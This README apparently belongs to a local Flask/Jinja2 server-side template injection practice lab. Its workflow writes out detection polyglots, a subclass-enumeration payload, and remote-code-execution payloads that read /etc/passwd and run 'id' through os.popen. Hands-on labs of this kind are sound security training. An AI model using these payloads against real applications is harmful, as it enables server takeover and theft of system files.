# Server-Side Template Injection (SSTI) Lab

## Overview
Practice detecting and exploiting Server-Side Template Injection vulnerabilities in Python/Flask Jinja2 templates (PortSwigger Web Security Academy topic 11).

- **Default Port / Access**: `http://localhost:8094`
- **Container Name**: `cyberlab_web_ssti_jinja2`
- **Shortcut**: `./lab start ssti`

---

## Exploitation Workflow

1. **Detection & Polyglot Payload**:
   Inject standard template expressions into input fields/parameters:
   ```text
   {{ 7 * 7 }}
   ${ 7 * 7 }
   <%= 7 * 7 %>
   #{ 7 * 7 }
   ```
   If the application reflects `49`, SSTI is confirmed.

2. **Jinja2 Class Extraction**:
   Inspect available Python MRO classes:
   ```text
   {{ ''.__class__.__mro__[1].__subclasses__() }}
   ```

3. **Remote Code Execution (RCE)**:
   Invoke `os.popen` or `subprocess.Popen` via the subclasses:
   ```text
   {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
   {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
   ```

---

## YouTube Walkthroughs & Solving Guides
- [PwnFunction - Server-Side Template Injections Explained](https://www.youtube.com/watch?v=SN6EVIG4c-0)
- [Seven Seas Security - SSTI Complete Lab Breakdown (Basic SSTI)](https://www.youtube.com/watch?v=QLqHMMcBXuQ)
- [Seven Seas Security - SSTI Lab Breakdown (Code Context)](https://www.youtube.com/watch?v=HC8CYztjkA8)
